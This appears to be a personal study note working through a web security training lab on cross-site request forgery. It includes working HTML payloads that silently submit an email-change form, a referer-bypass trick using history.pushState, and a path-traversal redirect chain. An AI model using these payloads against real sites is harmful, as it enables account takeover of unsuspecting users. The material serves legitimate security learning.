This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

---

temp
```html
<html>
    <head>
        <meta name="referrer" content="never"> 
    </head>
    <body>
        <h1>Hello world!</h1>
        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
            <input type="hidden" name="email" value="test6@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

Analysis:

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: no csrf token

Testing Referer header for CSRF attacks:
1. Remove the Referer header
2. Check which portion of the referrer header is the application validating

Always check for if the App accepts the GET method. This is useful if the attacker can find a client side redirect. If you had a comment section, the App might redirect to the output of the comment for example.

The App only does not validate the schema in the referer:

![[IMG/Pasted image 20240924102827.png]]

```html
<html>
    <body>
        <script>history.pushState('','','/?0a9e0009033f679984f1dd4a00b70051.web-security-academy.net/my-account')</script>
        <h1>Hello World!</h1>
        <form action="https://0a9e0009033f679984f1dd4a00b70051.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

_History PushState: https://developer.mozilla.org/en-US/docs/Web/API/History/pushState_

---
I can play around with the redirect request and get it to try and take me to `my-account`

`https://0a7100b70485f16d8131585b003f00c0.web-security-academy.net/post/comment/confirmation?postId=my-account/`

It doesn't allow me, but i can access it buy using path traversal:

`https://0a7100b70485f16d8131585b003f00c0.web-security-academy.net/post/comment/confirmation?postId=../my-account/`

I could now add onto this command and tell it to change the email address:

`https://0a7100b70485f16d8131585b003f00c0.web-security-academy.net/post/comment/confirmation?postId=my-account/change-email?=email=test@gmail.com&submit=1`

Try `%40` instead of `@` in the email if you get any issues, and `%26` for the `&`.

```http
https://0a7100b70485f16d8131585b003f00c0.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test%40gmail.com%26submit=1
```

```html
<script>
window.location = "<URL>"
</script>
```

```html
<script>
window.location = "https://0a7100b70485f16d8131585b003f00c0.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test%40gmail.com%26submit=1"
</script>
```

The above does seem to work when i do it manually, so maybe the servers are playing up again. 

```http
https://0a7100b70485f16d8131585b003f00c0.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=tester123%40gmail.com%26submit=1
```

![[IMG/Pasted image 20240924110839.png]]

